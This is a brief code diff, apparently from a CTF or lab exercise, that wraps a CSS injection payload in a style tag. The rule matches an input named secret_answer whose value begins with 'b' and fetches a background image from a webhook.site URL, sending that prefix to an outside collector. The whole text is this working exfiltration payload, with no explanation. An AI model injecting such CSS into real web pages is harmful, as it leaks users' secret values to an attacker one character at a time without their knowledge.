@@ -1,1 +1,3 @@
-input[name=secret_answer][value^=b] { background-image: url(https://webhook.site/011428da-dbac-42c1-8f2e-e695f4f06738/leak?pre=b); }
+<style>
+        input[name=secret_answer][value^=b] { background-image: url(https://webhook.site/011428da-dbac-42c1-8f2e-e695f4f06738/leak?pre=b); }
+</style>
